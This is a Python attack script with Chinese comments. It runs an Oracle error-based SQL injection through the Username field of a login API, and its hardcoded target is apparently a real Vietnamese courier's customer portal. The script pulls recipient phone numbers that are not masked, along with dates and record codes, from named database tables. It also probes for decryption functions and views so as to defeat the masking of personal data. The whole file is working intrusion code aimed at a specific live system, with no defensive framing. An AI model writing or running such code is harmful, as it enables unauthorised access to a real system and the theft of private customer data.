#!/usr/bin/env python3
"""
简单直接：找真正未脱敏的收件人电话
"""

import requests
import json
import time

class RealDataFinder:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def find_unmasked_in_all_tables(self):
        """在所有可能的表中查找未脱敏的收件人电话"""
        print("=" * 80)
        print("🔍 在所有表中查找真正未脱敏的收件人电话")
        print("=" * 80)
        
        # 测试条件：
        # 1. 以0开头（越南电话）
        # 2. 长度10位
        # 3. 不包含+或x
        # 4. 全数字
        
        tables_and_fields = [
            ('E1E2_PH', 'DIENTHOAINHAN', 'NGAY'),
            ('E1E2_PH_TEMP_DATA2_LOG', 'DIENTHOAINHAN', 'NGAY'),
            ('E1E2_PH_DECRYPT_DATA', 'DIENTHOAINHAN', 'NGAY'),
            ('E1E2_PH_LOG', 'DIENTHOAINHAN', 'NGAY'),
            ('SHIPMENT', 'RECEIVER_PHONE', 'CREATE_DATE'),
            ('DONHANG', 'DIENTHOAINHAN', 'NGAYTAO'),
            ('DELIVERY', 'RECEIVER_PHONE', 'CREATE_DATE'),
        ]
        
        found_real = False
        
        for table, phone_field, date_field in tables_and_fields:
            print(f"\n{'='*80}")
            print(f"表: EMS.{table}")
            print(f"{'='*80}")
            
            # 方法1: 查找0开头10位数字
            queries = [
                (f"0开头10位", f"SELECT {phone_field} FROM EMS.{table} WHERE SUBSTR({phone_field},1,1)='0' AND LENGTH({phone_field})=10 AND REGEXP_LIKE({phone_field},'^[0-9]+$') AND ROWNUM=1"),
                (f"09开头无+", f"SELECT {phone_field} FROM EMS.{table} WHERE {phone_field} LIKE '09%' AND {phone_field} NOT LIKE '%+%' AND LENGTH({phone_field})=10 AND ROWNUM=1"),
                (f"03开头无+", f"SELECT {phone_field} FROM EMS.{table} WHERE {phone_field} LIKE '03%' AND {phone_field} NOT LIKE '%+%' AND LENGTH({phone_field})=10 AND ROWNUM=1"),
            ]
            
            for desc, query in queries:
                result = self.extract_via_error(query)
                
                if result and result != 'NULL':
                    print(f"  [{desc}] ✅ 找到: {result}")
                    
                    # 验证是否真的未脱敏
                    if '+' not in result and 'x' not in result and len(result) == 10:
                        print(f"    ✅ 这是真实电话！")
                        found_real = True
                        
                        # 获取这条记录的日期
                        time.sleep(1)
                        query_date = f"SELECT {date_field} FROM EMS.{table} WHERE {phone_field}='{result}' AND ROWNUM=1"
                        date = self.extract_via_error(query_date)
                        
                        if date:
                            print(f"    📅 日期: {date}")
                            
                            if date == '20251010':
                                print(f"    🎉 是10月10日的！")
                            else:
                                print(f"    ⚠️  是{date}的数据")
                        
                        # 获取MABC
                        time.sleep(1)
                        query_mabc = f"SELECT MABC FROM EMS.{table} WHERE {phone_field}='{result}' AND ROWNUM=1"
                        mabc = self.extract_via_error(query_mabc)
                        
                        if mabc:
                            print(f"    📋 MABC: {mabc}")
                    else:
                        print(f"    ❌ 仍然是脱敏数据")
                
                time.sleep(2)
        
        return found_real
    
    def check_recent_date_unmasked(self):
        """检查最近日期是否有未脱敏数据"""
        print("\n" + "=" * 80)
        print("📅 检查最近几天是否有未脱敏的收件人电话")
        print("=" * 80)
        
        dates = ['20251010', '20251009', '20251008', '20251007']
        
        for date in dates:
            print(f"\n{'='*80}")
            print(f"日期: {date}")
            print(f"{'='*80}")
            
            # E1E2_PH表
            query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)=10"
            count1 = self.extract_via_error(query1)
            
            print(f"  E1E2_PH: {count1 if count1 else 0} 条未脱敏记录")
            
            time.sleep(1)
            
            # TEMP_DATA2_LOG表
            query2 = f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)=10"
            count2 = self.extract_via_error(query2)
            
            print(f"  TEMP_DATA2_LOG: {count2 if count2 else 0} 条未脱敏记录")
            
            time.sleep(1)
            
            # SHIPMENT表
            query3 = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE NOT LIKE '%+%' AND RECEIVER_PHONE NOT LIKE '%x%' AND LENGTH(RECEIVER_PHONE)=10"
            count3 = self.extract_via_error(query3)
            
            print(f"  SHIPMENT: {count3 if count3 else 0} 条未脱敏记录")
            
            time.sleep(2)
    
    def try_decrypt_function(self):
        """尝试查找解密函数"""
        print("\n" + "=" * 80)
        print("🔑 查找可能的解密函数或方法")
        print("=" * 80)
        
        # 搜索可能的解密函数
        function_keywords = [
            'DECRYPT',
            'UNMASK',
            'DECODE_PHONE',
            'GET_REAL_PHONE',
            'PHONE_DECRYPT',
        ]
        
        for keyword in function_keywords:
            print(f"\n尝试函数: {keyword}")
            
            # 测试是否存在这个函数
            query = f"SELECT {keyword}('test') FROM DUAL"
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in str(result):
                print(f"  ✅ 函数存在！")
            else:
                print(f"  ❌ 函数不存在")
            
            time.sleep(1)
    
    def find_decrypt_method_in_views(self):
        """在视图中查找解密方法"""
        print("\n" + "=" * 80)
        print("👁️  检查视图是否有解密数据")
        print("=" * 80)
        
        views = [
            'E1E2_PH_VIEW',
            'V_E1E2_PH',
            'V_SHIPMENT',
        ]
        
        for view in views:
            print(f"\n{'='*80}")
            print(f"视图: EMS.{view}")
            print(f"{'='*80}")
            
            # 查看样本数据
            query = f"SELECT DIENTHOAINHAN FROM EMS.{view} WHERE NGAY='20251010' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM=1"
            result = self.extract_via_error(query)
            
            if result:
                print(f"  样本电话: {result}")
                
                if '+' not in result and 'x' not in result and len(result) == 10:
                    print(f"  ✅ 这是真实电话！视图有解密功能！")
                else:
                    print(f"  ❌ 仍然脱敏")
            else:
                print(f"  ⚠️  视图不存在或无数据")
            
            time.sleep(2)
    
    def final_summary(self, found_real):
        """最终总结"""
        print("\n" + "=" * 80)
        print("📊 最终结论")
        print("=" * 80)
        
        if found_real:
            print("\n✅ 找到了未脱敏的收件人电话！")
            print("可以用MABC等字段关联获取真实数据")
        else:
            print("\n❌ 所有表的收件人电话都已脱敏")
            print("\n可能的原因：")
            print("  1. 系统严格执行数据脱敏政策")
            print("  2. 真实数据在其他无权访问的表/库中")
            print("  3. 需要特殊权限或解密函数")
            print("\n✅ 可以获取的真实数据：")
            print("  - 发件人电话（完整）")
            print("  - 收件人电话后4位")
            print("  - 收件人姓名（部分）")
            print("  - 收件人地址（部分）")
    
    def run_search(self):
        """执行完整搜索"""
        print("=" * 80)
        print("🔍 全面搜索未脱敏的收件人电话")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 执行所有搜索
        found = self.find_unmasked_in_all_tables()
        self.check_recent_date_unmasked()
        self.try_decrypt_function()
        self.find_decrypt_method_in_views()
        self.final_summary(found)
        
        print("\n" + "=" * 80)
        print("🎉 搜索完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    finder = RealDataFinder(target_url)
    finder.run_search()
